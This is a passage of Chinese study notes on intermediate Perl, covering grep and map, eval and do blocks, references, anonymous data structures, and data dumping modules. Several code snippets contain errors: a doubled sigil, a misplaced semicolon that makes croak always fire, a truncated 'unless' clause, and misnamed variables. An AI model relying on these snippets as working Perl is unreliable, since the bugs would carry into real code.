<code>local::lib</code> 模块.</p><p>若要明确使用:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ cpan --local-lib HTML::Parser<br></code></pre></td></tr></table></figure><p>在程序中使用 <code>local::lib</code> 模块, 程序就知道在何处查找我们安装的模块.</p><p>还可这样处理任何路径:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -Mlocal::lib=<span class="hljs-string">&#x27;~/perlstuff&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="第3章-中级基础"><a href="#第3章-中级基础" class="headerlink" title="第3章 中级基础"></a>第3章 中级基础</h1><h2 id="3-1-列表操作符"><a href="#3-1-列表操作符" class="headerlink" title="3.1 列表操作符"></a>3.1 列表操作符</h2><h3 id="3-1-1-使用-grep-表达式"><a href="#3-1-1-使用-grep-表达式" class="headerlink" title="3.1.1 使用 grep 表达式"></a>3.1.1 使用 grep 表达式</h3><p>可匹配正则表达式:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @end_in_4 = <span class="hljs-keyword">grep</span> <span class="hljs-regexp">/4$/</span>, @input_numbers;<br></code></pre></td></tr></table></figure><p>如果测试过于复杂, 就可以将其隐藏在一个子例程中:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @odd_digit_sum = <span class="hljs-keyword">grep</span> digit_sum_is_odd($_), @input_numbers;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">digit_sum_is_odd</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $input = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">my</span> @digits = <span class="hljs-keyword">split</span> <span class="hljs-regexp">//</span>, $input;<br>    <span class="hljs-keyword">my</span> $sum;<br>    $sum += $_ <span class="hljs-keyword">for</span> @ @digits;<br>    <span class="hljs-keyword">return</span> $sum % <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>另一种写法为:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $test = <span class="hljs-keyword">grep</span> &#123; ... &#125; @list;<br></code></pre></td></tr></table></figure><p>这里的代码块实际上是一个匿名子例程.</p><p>能够引入作用域限于 “块” 的变量, 即使用 <code>my</code>.</p><h3 id="3-1-2-使用-map-转换列表"><a href="#3-1-2-使用-map-转换列表" class="headerlink" title="3.1.2 使用 map 转换列表"></a>3.1.2 使用 map 转换列表</h3><p>可以每个输入产生两个输出:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @result = <span class="hljs-keyword">map</span> &#123; $_, <span class="hljs-number">3</span> * $_ &#125; @input_numbers;<br></code></pre></td></tr></table></figure><p>可直接使用 map 表达式生成散列:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> %hash = <span class="hljs-keyword">map</span> &#123; $_, <span class="hljs-number">3</span> * $_ &#125; @input_numbers;<br></code></pre></td></tr></table></figure><p>可以为每个输入项生成不同的输出项:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @result = <span class="hljs-keyword">map</span> &#123; <span class="hljs-keyword">split</span> <span class="hljs-regexp">//</span> &#125; @input_numbers;<br></code></pre></td></tr></table></figure><p><code>split //</code> 就是直接把输入拆开.</p><p>如果一个特定调用的结果是空列表, map 表达式就将这个空结果连接到更大的列表中, 不为列表添加任何元素:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @result = <span class="hljs-keyword">map</span> &#123;<br>    <span class="hljs-keyword">my</span> @digits = <span class="hljs-keyword">split</span> <span class="hljs-regexp">//</span>, $_;<br>    <span class="hljs-keyword">if</span> ($digits[-<span class="hljs-number">1</span>] == <span class="hljs-number">4</span>) &#123;<br>        @digits;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        (  );   <span class="hljs-comment"># 返回的空列表</span><br>    &#125;<br>&#125; @input_numbers;<br></code></pre></td></tr></table></figure><p>能够用 map 表达式和 grep 表达式做的所有事情, 也能够使用显示的 foreach 循环完成.</p><h2 id="3-2-使用-eval-捕获错误"><a href="#3-2-使用-eval-捕获错误" class="headerlink" title="3.2 使用 eval 捕获错误"></a>3.2 使用 eval 捕获错误</h2><p>eval 表达式是 Perl 的首选异常机制.</p><p>最常见的是在 eval 语句块执行完之后立即检查 <code>$@</code>, 该特殊变量为空则意味着没有错误.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">eval</span> &#123; $average = $total / $count &#125;;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;continuing after error: $@&quot;</span> <span class="hljs-keyword">if</span> $@;<br><br><span class="hljs-keyword">eval</span> &#123; rescue_scheme_42() &#125;;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;continuing after error: $@&quot;</span> <span class="hljs-keyword">if</span> $@;<br></code></pre></td></tr></table></figure><p>eval 语句块后的分号是必须的, eval 是一个术语, 而不是控制结构.</p><p>块中的代码运行失败, 在标量上下文中返回 undef, 在列表上下文中返回空列表. 成功则有正常的返回值.</p><p>eval 不捕获警告, 语法错误, 和 perl 自己中断执行的错误.</p><h2 id="3-3-用-eval-语句块动态编译代码"><a href="#3-3-用-eval-语句块动态编译代码" class="headerlink" title="3.3 用 eval 语句块动态编译代码"></a>3.3 用 eval 语句块动态编译代码</h2><p>eval 语句块的第二种形式: 参数是字符串表达式而不是代码块. 在运行时通过字符串的方式编译和执行代码. 但是不建议对字符串使用 eval 语句块.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">eval</span> <span class="hljs-string">&#x27;$sum = 2 + 2&#x27;</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;The sum is $sum\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>Perl 在词法上下文中执行 eval 语句块前后的代码, eval 语句块的结果即为最后一个表达式的值.</p><p>如果 eval 语句块不能够正确编译并且不能正确运行我们传递的 Perl 代码, 同样设置 <code>$@</code> 变量.</p><h2 id="3-4-使用-do-语句块"><a href="#3-4-使用-do-语句块" class="headerlink" title="3.4 使用 do 语句块"></a>3.4 使用 do 语句块</h2><p>do 语句执行的结果同样是最后一个表达式的值. do  语句可以把一组语句聚集为单个表达式.</p><p>如, 将:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $bowler;<br><span class="hljs-keyword">if</span> (...) &#123;<br>    $bowler = <span class="hljs-string">&#x27;Mary Ann&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">elsif</span> (...) &#123;<br>    $bowler = <span class="hljs-string">&#x27;Ginger&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    $bowler = <span class="hljs-string">&#x27;The Professor&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>用 do 表达式写为:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $bowler = <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-keyword">if</span> (...) &#123; <span class="hljs-string">&#x27;Mary Ann&#x27;</span> &#125;<br>    <span class="hljs-keyword">elsif</span> (...) &#123; <span class="hljs-string">&#x27;Ginger&#x27;</span> &#125;<br>    <span class="hljs-keyword">else</span> &#123; <span class="hljs-string">&#x27;The Professor&#x27;</span> &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>do 语句适合创建一个操作的作用域</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $file_contents = <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-keyword">local</span> $/;<br>    <span class="hljs-keyword">local</span> @ARGV = ( $filename );<br>    &lt;&gt;<br>&#125;;<br></code></pre></td></tr></table></figure><p>同样可以向 do 语句块提供字符串的形式, 其会尝试通过该字符串名称加载, 编译文件:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">do</span> $filename;<br></code></pre></td></tr></table></figure><p>内置的 <code>require</code> 同样也可用于加载模块:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">require</span> List::Util;<br></code></pre></td></tr></table></figure><p><code>use</code> 语句实际上是一个 BEGIN 块中 <code>require</code> 语句和调用类导入的内容:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">BEGIN &#123;<br>    <span class="hljs-keyword">require</span> List::Util;<br>    List::Util-&gt;import(...);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h2><p>判断某个条件错误时执行某个操作使用 <code>unless</code> 比较合适.</p><p>从外部文件或 STDIN 获取输入时, 最好用 <code>chomp</code> 去除换行符.</p><h1 id="第4章-引用简介"><a href="#第4章-引用简介" class="headerlink" title="第4章 引用简介"></a>第4章 引用简介</h1><h2 id="4-1-在多个数组上完成相同的任务"><a href="#4-1-在多个数组上完成相同的任务" class="headerlink" title="4.1 在多个数组上完成相同的任务"></a>4.1 在多个数组上完成相同的任务</h2><p>Perl 的参数列表是 <code>@_</code> 数组. 传递参数同样通过括号.</p><h2 id="PeGS-Perl-图形结构"><a href="#PeGS-Perl-图形结构" class="headerlink" title="PeGS: Perl 图形结构"></a>PeGS: Perl 图形结构</h2><p>PeGS (Perl Graphical Structure). 是 Perl 数据结构的图形表示方式.</p><p>大多数 PeGS 图由两部分组成: 变量名称和该变量引用的数据.</p><h2 id="4-3-对数组取引用"><a href="#4-3-对数组取引用" class="headerlink" title="4.3 对数组取引用"></a>4.3 对数组取引用</h2><p>反斜线 <code>\</code> 用于 “取引用” 操作.</p><p>如, 放在数组名称之前 <code>\@skipper</code> 就得到该数组的引用. 和 C 中的指针有些区别, 引用指向整个数组, 而不是数组本身的第一个元素的地址.</p><p>引用能够作为数组或者散列的元素, 也能直接放入普通标量变量中:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $ref_to_skipper = \@skipper;<br></code></pre></td></tr></table></figure><p>引用同样是指向地址, 引用的数值形式是 <code>@skipper</code> 数组在内部数据结构中唯一的内存地址, 该地址在数据的生存在周期内部都不会改变.</p><p>若是直接向子例程传递参数, 实际上是将参数都复制了一遍, 而使用引用则避免了这里的消耗.</p><h2 id="4-4-对数组引用进行解引用操作"><a href="#4-4-对数组引用进行解引用操作" class="headerlink" title="4.4 对数组引用进行解引用操作"></a>4.4 对数组引用进行解引用操作</h2><p>解引用实际上就是取地址上的值.</p><p>可以将数组的任意引用放入大括号中, 用于替换数组名称, 最后以i一个访问原始数组的方法作为结束 (也就是用大括号 “{}” 来解引用):</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">@skipper<br>@&#123; $items &#125;<br></code></pre></td></tr></table></figure><p>以下两种方法都指向数组的第二个元素:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">$skipper[<span class="hljs-number">1</span>]<br>$&#123; $items &#125;[<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure><h2 id="4-5-去除大括号"><a href="#4-5-去除大括号" class="headerlink" title="4.5 去除大括号"></a>4.5 去除大括号</h2><p>如果只是一个简单的标量值, 那么也可删除第一组大括号.</p><p>见书.</p><h2 id="4-6-修改数组"><a href="#4-6-修改数组" class="headerlink" title="4.6 修改数组"></a>4.6 修改数组</h2><p>修改解引用的数组就是修改原始数组.</p><h2 id="4-7-嵌套的数据结构"><a href="#4-7-嵌套的数据结构" class="headerlink" title="4.7 嵌套的数据结构"></a>4.7 嵌套的数据结构</h2><h2 id="4-8-用箭头简化嵌套元素的引用"><a href="#4-8-用箭头简化嵌套元素的引用" class="headerlink" title="4.8 用箭头简化嵌套元素的引用"></a>4.8 用箭头简化嵌套元素的引用</h2><p>在编写 <code>$&#123;DUMMY&#125;[$y]</code> 的任何地方, 都可以使用 <code>DUMMY-&gt;[$y]</code> 这种方式代替.(引用位于箭头之前)</p><p>通过在表达式后面用一个箭头和一个带方括号的下标定义数组引用, 就可以选取数组中一个特定的元素.</p><p>如:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$all_with_names[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure><p>另一条规则: 如果箭头位于 “下标类的符号” 之间, 也可以删除这些箭头:</p><p>例如(含义为, 先解引用 all_with_names 这个数组的第三个元素, 再…):</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$all_with_names[<span class="hljs-number">2</span>]-&gt;[<span class="hljs-number">1</span>]-&gt;[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>可以表达为:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$all_tith_names[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>基本上是有几个 <code>[]</code> 就是几重数组.</p><h2 id="4-9-散列的引用"><a href="#4-9-散列的引用" class="headerlink" title="4.9 散列的引用"></a>4.9 散列的引用</h2><p>同样使用 <code>\</code> 反斜线作为 “取引用” 操作符.</p><p>同样有大括号, 箭头形式.</p><p>对于数组切片或散列切片, 没有带箭头 (-&gt;) 的快捷方式.</p><p>如:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">for</span> <span class="hljs-keyword">my</span> $crewmember (@crew) &#123;<br>    <span class="hljs-keyword">printf</span> $format, @$crewmember&#123;<span class="hljs-string">qw(name shirt hat position)</span>&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-10-检查引用类型"><a href="#4-10-检查引用类型" class="headerlink" title="4.10 检查引用类型"></a>4.10 检查引用类型</h2><p>开始使用和传递引用时, 必须确保知道正在使用哪种类型的引用.</p><p>最简单的方式是使用 <code>ref</code> 函数.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Carp <span class="hljs-string">qw(croak)</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">show_hash</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $hash_ref = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">my</span> $ref_type = <span class="hljs-keyword">ref</span> $hash_ref;<br>    croak <span class="hljs-string">&quot;I expected a hash reference!&quot;</span>;<br>        <span class="hljs-keyword">unless</span> $ref_type eq <span class="hljs-string">&#x27;HASH&#x27;</span>;<br><br>        <span class="hljs-keyword">foreach</span> <span class="hljs-keyword">my</span> $key ( %$hash_ref ) &#123;<br>            ...<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>ref</code> 的返回值是类型名, 如 <code>HASH</code>.</p><p>constant 变量感觉类似于 C 中的宏定义:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> constant <span class="hljs-string">HASH =&gt;</span> <span class="hljs-keyword">ref</span> &#123;&#125;    <br><br>croak <span class="hljs-string">&quot;I expected a hash reference!&quot;</span><br>    <span class="hljs-keyword">unless</span> d<br></code></pre></td></tr></table></figure><p>Scalar::Util 模块中的 <code>reftype</code> 函数也能完成 <code>ref</code> 函数的任务.</p><p>可以使用 eval 检查:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">croak <span class="hljs-string">&quot;I expected a hash reference !&quot;</span><br>    <span class="hljs-keyword">unless</span> <span class="hljs-keyword">eval</span> &#123; <span class="hljs-keyword">keys</span> %$ref_type; <span class="hljs-number">1</span> &#125;<br></code></pre></td></tr></table></figure><h1 id="第5章-引用和作用域"><a href="#第5章-引用和作用域" class="headerlink" title="第5章 引用和作用域"></a>第5章 引用和作用域</h1><p>能够像标量一样复制并且传递引用.</p><h2 id="5-1-关于数据引用的更多信息"><a href="#5-1-关于数据引用的更多信息" class="headerlink" title="5.1 关于数据引用的更多信息"></a>5.1 关于数据引用的更多信息</h2><p>Perl 通过一个叫做 “引用计数” 的机制追踪有多少中访问数据的方法.</p><p>有了初始名称, 引用计数就为 1.</p><p>可以随意添加和删除引用, 并且只要引用计数没有减少到 0. Perl 就将在内存中保存该数组.</p><p>销毁引用, 可以把 undef 赋给该变量:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$ref_to_skipper = <span class="hljs-keyword">undef</span>;<br></code></pre></td></tr></table></figure><p>特殊情况下, 保存在子例程的私有 (词法) 变量中的引用, 将会在子例程的结尾销毁.</p><p>仅当所有引用销毁时, Perl 才会回收数组占用的内存.</p><h2 id="5-2-如果它曾是变量名将会怎样"><a href="#5-2-如果它曾是变量名将会怎样" class="headerlink" title="5.2 如果它曾是变量名将会怎样"></a>5.2 如果它曾是变量名将会怎样</h2><h2 id="5-3-引用计数和嵌套数据结构"><a href="#5-3-引用计数和嵌套数据结构" class="headerlink" title="5.3 引用计数和嵌套数据结构"></a>5.3 引用计数和嵌套数据结构</h2><p>删除数据树顶端的节点通常就意味着删除该数据树包含的所有数据.</p><p>Perl 会保证, 如果我们仍然拥有一个指向数据的引用, 就将仍然拥有该数据.</p><h2 id="5-4-当引用计数出现问题时"><a href="#5-4-当引用计数出现问题时" class="headerlink" title="5.4 当引用计数出现问题时"></a>5.4 当引用计数出现问题时</h2><p>当数据结构中的一部分以循环的方式指向数据结构的其他部分时, 就会出现问题.</p><h2 id="5-5-直接创建匿名数组"><a href="#5-5-直接创建匿名数组" class="headerlink" title="5.5 直接创建匿名数组"></a>5.5 直接创建匿名数组</h2><p>使用方括号:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $ref_to_skipper_provisions = <br>    [ <span class="hljs-string">qw(blue_shirt hat jacket preserver sunscreen)</span> ];<br></code></pre></td></tr></table></figure><p>取方括号内的值 (在列表上下文中求值), 为这些元素创建一个新的匿名数组, 并且返回该数组的引用.</p><p>使用方括号匿名数组构造函数得到的结果是一个数组引用, 该引用适用于标量变量适用的所有场合.</p><p>创建更大的列表:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $ref_to_skipper_provisions = <br>    [ <span class="hljs-string">qw(blue_shirt hat jacket preserver sunscreen)</span> ];<br>    <span class="hljs-keyword">my</span> @skipper_with_name = (<span class="hljs-string">&#x27;The Skipper&#x27;</span>, $ref_to_skipper_provisions);<br></code></pre></td></tr></table></figure><p>使用匿名数组的好处在于不用记忆中间名称.</p><p>可以用空的匿名数组构造器函数表示空的匿名数组引用.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">[<span class="hljs-string">&#x27;Mrs. Howell&#x27;</span>, <br>  [  ]<br>],<br></code></pre></td></tr></table></figure><h2 id="5-6-创建匿名散列"><a href="#5-6-创建匿名散列" class="headerlink" title="5.6 创建匿名散列"></a>5.6 创建匿名散列</h2><p>大括号 <code>&#123;&#125;</code> 是匿名散列构造函数.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $ref_to_gilligan_info = &#123;<br>    <span class="hljs-string">name     =&gt;</span> <span class="hljs-string">&#x27;Gilligan&#x27;</span>,<br>    <span class="hljs-string">hat      =&gt;</span> <span class="hljs-string">&#x27;White&#x27;</span>,<br>    <span class="hljs-string">shirt    =&gt;</span> <span class="hljs-string">&#x27;Red&#x27;</span>,<br>    <span class="hljs-string">position =&gt;</span> <span class="hljs-string">&#x27;First Mate&#x27;</span>,<br>&#125;<br></code></pre></td></tr></table></figure><p>注意, 当列表末尾的元素并非紧跟着右花括号, 方括号或小括号时, 可以以逗号结尾.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @crew = (<br>    &#123;<br>        <span class="hljs-string">name       =&gt;</span> <span class="hljs-string">&#x27;Gilligan&#x27;</span>,<br>        <span class="hljs-string">hat        =&gt;</span> <span class="hljs-string">&#x27;Gilligan&#x27;</span>,<br>        <span class="hljs-string">shirt      =&gt;</span> <span class="hljs-string">&#x27;Gilligan&#x27;</span>,<br>        <span class="hljs-string">position   =&gt;</span> <span class="hljs-string">&#x27;Gilligan&#x27;</span>,<br>    &#125;,<br>    &#123;<br>        <span class="hljs-string">name       =&gt;</span> <span class="hljs-string">&#x27;Skipper&#x27;</span>,<br>        <span class="hljs-string">hat        =&gt;</span> <span class="hljs-string">&#x27;Black&#x27;</span>,<br>        <span class="hljs-string">shirt      =&gt;</span> <span class="hljs-string">&#x27;Blue&#x27;</span>,<br>        <span class="hljs-string">position   =&gt;</span> <span class="hljs-string">&#x27;Captain&#x27;</span>,<br>    &#125;,<br>        )<br></code></pre></td></tr></table></figure><p>向编译器说明我们想要一个匿名散列构造函数, 就在左大括号之前放置一个加号:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">+&#123;...&#125;<br></code></pre></td></tr></table></figure><p>如果想得到一个代码块, 就在语句块开始处放置一个分号:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;; ...&#125;<br></code></pre></td></tr></table></figure><h2 id="5-7-自动带入"><a href="#5-7-自动带入" class="headerlink" title="5.7 自动带入"></a>5.7 自动带入</h2><h2 id="5-8-自动带入和散列"><a href="#5-8-自动带入和散列" class="headerlink" title="5.8 自动带入和散列"></a>5.8 自动带入和散列</h2><p>自动带入的一个便捷之处在于典型的数据压缩任务.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> %total_bytes;<br><span class="hljs-keyword">while</span> (&lt;&gt;) &#123;<br>    <span class="hljs-keyword">my</span> ($source, $destination, $bytes) = <span class="hljs-keyword">split</span>;<br>    $total_bytes&#123;$source&#125;&#123;$destination&#125; += $bytes;<br>&#125;<br></code></pre></td></tr></table></figure><p>此处两个大括号间有隐式的箭头.</p><h1 id="第6章-操作复杂的数据结构"><a href="#第6章-操作复杂的数据结构" class="headerlink" title="第6章 操作复杂的数据结构"></a>第6章 操作复杂的数据结构</h1><h2 id="6-1-使用调试器查看复杂的数据"><a href="#6-1-使用调试器查看复杂的数据" class="headerlink" title="6.1 使用调试器查看复杂的数据"></a>6.1 使用调试器查看复杂的数据</h2><p>最简单的一种是在命令行条件下调用 perl 并带上 <code>-d</code> 参数.</p><p>每个新发布的调试器都与之前发布的调试器在工作方式上略有不同.</p><p>有任何问题都可以通过输入 <code>h</code> 或者查看 <code>perldebug</code> 文档.</p><p>调试器会在执行前显示每一行正在调试的代码.</p><p><code>s</code> 命令将单步执行程序.</p><p><code>x</code> 命令显示存储在列表中的所有值.</p><h2 id="6-2-使用-Data-Dumper-模块查看复杂的数据"><a href="#6-2-使用-Data-Dumper-模块查看复杂的数据" class="headerlink" title="6.2 使用 Data::Dumper 模块查看复杂的数据"></a>6.2 使用 Data::Dumper 模块查看复杂的数据</h2><p>Data::Dumper 将 Perl 的数据结构显示为 Perl 代码.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Data::Dumper;<br><br><span class="hljs-keyword">my</span> %total_bytes;<br><span class="hljs-keyword">while</span> (&lt;&gt;) &#123;<br>    <span class="hljs-keyword">my</span> ($source, $destination, $bytes) = <span class="hljs-keyword">split</span>;<br>    $total_bytes&#123;$source&#125;&#123;$destination&#125; += $bytes;<br>&#125;<br><br><span class="hljs-keyword">print</span> Dumper(\%total_bytes);<br></code></pre></td></tr></table></figure><p>Data::Dumper 模块定义的 Dumper 子例程类似与调试器中的 <code>x</code> 命令. 其与 <code>x</code> 命令的区别在于, Dumper 生成的字符串是 Perl 代码.</p><h3 id="其他形式的转储程序"><a href="#其他形式的转储程序" class="headerlink" title="其他形式的转储程序"></a>其他形式的转储程序</h3><p>Data::Dump 模块有一个叫做 dump 的子例程, 与 Data::Dumper 模块的用法一致.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Data::Dump <span class="hljs-string">qw(dump)</span>;<br><span class="hljs-keyword">dump</span>( \%total_bytes );<br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Data::Printer;<br>p( %total_bytes );<br></code></pre></td></tr></table></figure><p>Data::Printer 模块的 p 子例程不需要一个引用作为参数:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Data::Printer;<br><br>p( %total_bytes );<br></code></pre></td></tr></table></figure><h2 id="6-3-数据编组"><a href="#6-3-数据编组" class="headerlink" title="6.3 数据编组"></a>6.3 数据编组</h2><p>能够将 Data::Dumper 模块 Dumper 子进程的输出放入一个文件中, 然后另一个程序加载该文件.</p><h3 id="6-3-1-使用-Storable-模块对复杂数据排序"><a href="#6-3-1-使用-Storable-模块对复杂数据排序" class="headerlink" title="6.3.1 使用 Storable 模块对复杂数据排序"></a>6.3.1 使用 Storable 模块对复杂数据排序</h3><p>编组数据: 将复杂数据转换成一种能够作为字节流写入文件的一种形式.</p><p>Perl 的 Storable 模块更适合编组数据.</p><p>Storable 生成更短小并且易于处理的文件.</p><p>freeze 